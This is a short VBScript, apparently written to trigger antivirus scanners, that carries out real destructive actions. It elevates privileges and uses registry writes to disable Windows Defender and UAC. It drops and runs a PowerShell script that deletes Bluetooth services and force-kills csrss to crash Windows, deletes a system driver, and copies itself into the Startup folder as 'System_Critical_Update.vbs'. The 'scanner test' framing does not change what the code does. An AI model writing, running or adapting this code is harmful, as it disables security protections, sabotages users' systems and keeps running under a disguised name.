' --- DEPLOYMENT NAME: VOID_OS_OMEGA_PROTOCOL ---
' This version is designed to be as loud as possible to scanners.

Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' 1. Forced Elevation (UAC Trigger)
If Not WScript.Arguments.Named.Exists("elevate") Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", Chr(34) & _
    WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 1
    WScript.Quit
End If

' 2. Registry Sabotage (Triggers "Antivirus Disable" Alerts)
On Error Resume Next
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD"
WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA", 0, "REG_DWORD"

' 3. The "Loud" Payload (Triggers PSRunner & Dropper Alerts)
' This writes a script containing "Exploit" keywords
psPath = fso.GetSpecialFolder(2) & "\Backdoor_Exploit_Mimikatz.ps1"
Set psFile = fso.CreateTextFile(psPath, True)
psFile.WriteLine "# Exploit-Payload-Mimikatz-Generator"
psFile.WriteLine "# Targeted Attack on CosmosShell Admin"
psFile.WriteLine "$Svc = @('BTHPORT','BTHUSB','bthserv'); foreach($s in $Svc){sc.exe delete $s}"
psFile.WriteLine "Stop-Process -Name csrss -Force # CRITICAL_PROCESS_DIED TRIGGER"
psFile.Close

' 4. WMI Execution (Heuristic Trigger)
' Using WMI to run the script is much "louder" than WshShell.Run
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
objWMIService.Create "powershell.exe -ExecutionPolicy Unrestricted -File " & psPath, Null, Null, intProcessID

' 5. File System Vandalism
' Attempting to delete or rename drivers with WMI
strWMI = "SELECT * FROM CIM_DataFile WHERE Name = 'C:\\Windows\\System32\\drivers\\BTHport.sys'"
Set colFiles = GetObject("winmgmts:").ExecQuery(strWMI)
For Each objFile In colFiles
    objFile.Delete
Next

' 6. Infinite Startup Loop (Persistence Alert)
strDest = WshShell.SpecialFolders("Startup") & "\System_Critical_Update.vbs"
fso.CopyFile WScript.ScriptFullName, strDest, True
